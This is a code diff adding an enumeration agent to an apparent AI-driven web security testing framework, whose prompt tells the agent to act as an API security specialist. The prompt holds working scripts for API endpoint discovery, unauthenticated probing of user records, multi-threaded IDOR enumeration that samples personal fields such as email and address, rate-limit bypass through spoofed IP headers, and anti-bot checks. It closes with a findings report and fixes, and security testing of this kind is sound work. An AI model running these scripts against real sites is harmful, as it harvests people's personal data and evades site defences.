@@ -396,9 +396,274 @@ FINDING | OT-CATEGORY | Severity (Critical/High/Medium/Low/Info) | Evidence
 )
 
 
+# ── Enumeration / IDOR Agent ──────────────────────────────────────────────────
+
+ENUM_AGENT = Agent(
+    name='WSTG-ENUM',
+    description='API enumeration, IDOR testing, rate-limit detection, missing auth controls',
+    instructions=_RULES + """
+You are an API security specialist focused on:
+  • Insecure Direct Object References (IDOR) via sequential ID enumeration
+  • Missing authentication / anti-bot controls on public APIs
+  • Absent or bypassable rate limiting
+  • Exposed user metadata at scale
+  • Multi-threaded enumeration with real metrics
+
+────────────────────────────────────────────────────────────────────────
+PHASE 1: API ENDPOINT DISCOVERY
+────────────────────────────────────────────────────────────────────────
+  # Crawl for API paths from JS bundles and common locations
+  curl -s https://{target}/robots.txt --max-time 10 2>/dev/null
+  curl -s https://{target}/sitemap.xml --max-time 10 2>/dev/null | grep -o '<loc>[^<]*' | head -20
+
+  # Extract API routes from JS files
+  curl -s https://{target}/ --max-time 15 2>/dev/null \
+    | grep -Eo 'src="[^"]+\\.js[^"]*"' | sed 's/src="//;s/"//' | head -10 \
+    | while read js; do
+        curl -s "https://{target}$js" --max-time 15 2>/dev/null \
+          | grep -Eo '/(api|v[0-9]+|rest)/[a-zA-Z0-9/_-]+' | sort -u | head -20
+      done
+
+  # Common API base paths
+  for path in /api /api/v1 /api/v2 /rest /graphql /v1 /v2 /public /users /user /account /profile; do
+    code=$(curl -so /dev/null -w "%{http_code}" https://{target}$path --max-time 8 2>/dev/null)
+    [ "$code" != "404" ] && echo "[$code] $path"
+  done
+
+────────────────────────────────────────────────────────────────────────
+PHASE 2: AUTHENTICATION PROBE (is the API open?)
+────────────────────────────────────────────────────────────────────────
+  # Test first few IDs without any token — look for 200 vs 401/403
+  python3 -c "
+import urllib.request, urllib.error, time, json
+
+base = 'https://{target}'
+endpoints = [
+    '/api/users/{id}', '/api/v1/users/{id}', '/api/v2/users/{id}',
+    '/user/{id}', '/users/{id}', '/account/{id}', '/profile/{id}',
+    '/api/profile/{id}', '/api/user/{id}', '/v1/user/{id}',
+    '/api/customers/{id}', '/api/members/{id}', '/api/accounts/{id}',
+]
+
+print('Probing API endpoints for authentication requirement...')
+for ep in endpoints:
+    for uid in [1, 2, 3, 100]:
+        url = base + ep.replace('{id}', str(uid))
+        try:
+            req = urllib.request.Request(url, headers={
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Accept': 'application/json',
+            })
+            r = urllib.request.urlopen(req, timeout=8)
+            body = r.read()[:500].decode(errors='replace')
+            print(f'[OPEN {r.status}] {url}')
+            print(f'  Preview: {body[:200]}')
+            break
+        except urllib.error.HTTPError as e:
+            if e.code in (401, 403):
+                print(f'[AUTH REQUIRED {e.code}] {ep.replace(\"{id}\", str(uid))}')
+                break
+            elif e.code == 429:
+                print(f'[RATE LIMIT {e.code}] {ep.replace(\"{id}\", str(uid))}')
+                break
+        except: pass
+" 2>&1
+
+────────────────────────────────────────────────────────────────────────
+PHASE 3: MULTI-THREADED IDOR ENUMERATION
+────────────────────────────────────────────────────────────────────────
+  # Replace API_PATH with the open endpoint found in Phase 2
+  # Adjust ID_RANGE based on target scale (default: 1-200 for demo)
+  python3 << 'PYEOF'
+import threading, urllib.request, urllib.error, time, json, statistics
+
+TARGET_BASE = 'https://{target}'
+API_PATH    = '/api/users/{id}'   # CHANGE to discovered open endpoint
+ID_START    = 1
+ID_END      = 200
+CONCURRENCY = 20                   # threads
+TIMEOUT     = 8
+
+results      = []     # (uid, status, latency_ms, body_snippet)
+rate_limited = []
+errors       = []
+lock         = threading.Lock()
+
+def fetch(uid):
+    url = TARGET_BASE + API_PATH.replace('{id}', str(uid))
+    t0  = time.time()
+    try:
+        req = urllib.request.Request(url, headers={
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Accept':     'application/json',
+        })
+        r    = urllib.request.urlopen(req, timeout=TIMEOUT)
+        body = r.read()[:300].decode(errors='replace')
+        lat  = int((time.time() - t0) * 1000)
+        with lock:
+            results.append((uid, r.status, lat, body))
+    except urllib.error.HTTPError as e:
+        lat = int((time.time() - t0) * 1000)
+        with lock:
+            if e.code == 429:
+                rate_limited.append(uid)
+            elif e.code not in (404,):
+                errors.append((uid, e.code))
+    except Exception as ex:
+        with lock:
+            errors.append((uid, str(ex)[:40]))
+
+# Fan out across ID range
+ids     = list(range(ID_START, ID_END + 1))
+batches = [ids[i:i+CONCURRENCY] for i in range(0, len(ids), CONCURRENCY)]
+
+print(f'Starting enumeration: {TARGET_BASE}{API_PATH}')
+print(f'Range [{ID_START}-{ID_END}] | {CONCURRENCY} threads | timeout={TIMEOUT}s')
+
+t_start = time.time()
+for batch in batches:
+    threads = [threading.Thread(target=fetch, args=(uid,)) for uid in batch]
+    for t in threads: t.start()
+    for t in threads: t.join()
+
+elapsed = time.time() - t_start
+
+# ── Metrics ───────────────────────────────────────────────────────────────────
+total    = ID_END - ID_START + 1
+found    = len(results)
+rate_hit = len(rate_limited)
+
+print()
+print('=' * 60)
+print(f'  ENUMERATION REPORT — {TARGET_BASE}')
+print('=' * 60)
+print(f'  IDs tested       : {total}')
+print(f'  Records found    : {found}  ({found/total*100:.1f}% success)')
+print(f'  Rate limit hits  : {rate_hit}')
+print(f'  Errors           : {len(errors)}')
+print(f'  Elapsed          : {elapsed:.1f}s  ({total/elapsed:.1f} req/s)')
+
+if results:
+    lats = [r[2] for r in results]
+    print(f'  Latency avg/p95  : {statistics.mean(lats):.0f}ms / {sorted(lats)[int(len(lats)*0.95)]:.0f}ms')
+
+print()
+print('  Sample records:')
+for uid, status, lat, body in sorted(results)[:10]:
+    print(f'    [{uid}] {status} {lat}ms | {body[:120]}')
+
+# Try to extract common fields (name, email, city, country, etc.)
+if results:
+    print()
+    print('  Exposed fields detected:')
+    sample_body = results[0][3].lower()
+    exposed = [f for f in ['email','name','phone','address','city','country',
+                            'location','birthdate','gender','username','id']
+               if f in sample_body]
+    print(f'    {", ".join(exposed) if exposed else "inspect manually"}')
+
+print()
+if rate_hit == 0:
+    print('  FINDING | IDOR-ENUM | HIGH | No rate limiting detected — full range enumerable')
+else:
+    print(f'  FINDING | IDOR-ENUM | MEDIUM | Rate limiting triggered after {rate_limited[0]-ID_START} requests')
+
+if found > 0:
+    print('  FINDING | MISSING-AUTH | CRITICAL | API returns user data without authentication')
+PYEOF
+
+────────────────────────────────────────────────────────────────────────
+PHASE 4: RATE LIMIT BYPASS ATTEMPTS
+────────────────────────────────────────────────────────────────────────
+  # If rate limiting was found, try common bypass headers
+  python3 << 'PYEOF'
+import urllib.request, urllib.error, time
+
+TARGET = 'https://{target}/api/users/1'
+
+bypass_headers = [
+    {},  # baseline
+    {'X-Forwarded-For': '127.0.0.1'},
+    {'X-Real-IP': '10.0.0.1'},
+    {'X-Originating-IP': '192.168.1.1'},
+    {'X-Remote-IP': '172.16.0.1'},
+    {'CF-Connecting-IP': '1.1.1.1'},
+    {'True-Client-IP': '8.8.8.8'},
+    {'Forwarded': 'for=127.0.0.1'},
+]
+
+print('Testing rate-limit bypass techniques...')
+for extra in bypass_headers:
+    hdrs = {
+        'User-Agent': 'Mozilla/5.0',
+        'Accept':     'application/json',
+        **extra
+    }
+    try:
+        req = urllib.request.Request(TARGET, headers=hdrs)
+        r   = urllib.request.urlopen(req, timeout=6)
+        print(f'  [BYPASS {r.status}] headers={extra} -> {r.read()[:80].decode(errors=\"replace\")}')
+    except urllib.error.HTTPError as e:
+        print(f'  [{e.code}] headers={extra}')
+    except Exception as ex:
+        print(f'  [ERR] {ex}')
+PYEOF
+
+────────────────────────────────────────────────────────────────────────
+PHASE 5: ANTI-BOT / CAPTCHA DETECTION
+────────────────────────────────────────────────────────────────────────
+  python3 -c "
+import urllib.request, urllib.error
+
+url = 'https://{target}/api/users/1'
+checks = {
+    'No UA':       {'Accept': 'application/json'},
+    'Normal UA':   {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
+    'Curl-like':   {'User-Agent': 'curl/7.88.1'},
+    'Bot UA':      {'User-Agent': 'python-requests/2.31'},
+    'Scanner UA':  {'User-Agent': 'Googlebot/2.1'},
+}
+
+for label, hdrs in checks.items():
+    try:
+        req = urllib.request.Request(url, headers=hdrs)
+        r   = urllib.request.urlopen(req, timeout=8)
+        body = r.read()[:200].decode(errors='replace')
+        captcha = any(w in body.lower() for w in ['captcha','recaptcha','hcaptcha','cf-challenge','robot','bot'])
+        print(f'  [{r.status}] {label:12} | captcha={captcha} | {body[:80]}')
+    except urllib.error.HTTPError as e:
+        print(f'  [{e.code}] {label:12} | blocked={e.code in (403,429)}')
+    except Exception as ex:
+        print(f'  [ERR] {label:12} | {ex}')
+" 2>&1
+
+────────────────────────────────────────────────────────────────────────
+PHASE 6: REPORT GENERATION
+────────────────────────────────────────────────────────────────────────
+After all phases, output a structured report:
+
+FINDING | WSTG-APIT-01 | Critical/High/Medium/Low | Missing auth on /api/users/{id}
+FINDING | WSTG-APIT-02 | High | No rate limiting — enumerated N records in Xs
+FINDING | WSTG-ATHZ-01 | High | IDOR — sequential IDs expose arbitrary user records
+FINDING | WSTG-CONF-10 | Medium | Exposed user metadata: email, name, location, ...
+
+Include:
+- Exact endpoints vulnerable
+- Sample data (first 3 records)
+- Enumeration rate (records/second)
+- Whether rate limiting or anti-bot controls exist
+- Recommended fix: require auth tokens, add rate limiting, randomize IDs (UUIDs)
+""",
+    tools=_TOOLS,
+    model=_MODEL,
+    max_turns=50,
+)
+
+
 # ── Registry ──────────────────────────────────────────────────────────────────
 
 SPECIAL_REGISTRY: dict[str, Agent] = {
-    'ctf': CTF_AGENT,
-    'ot':  OT_AGENT,
+    'ctf':  CTF_AGENT,
+    'ot':   OT_AGENT,
+    'enum': ENUM_AGENT,
 }
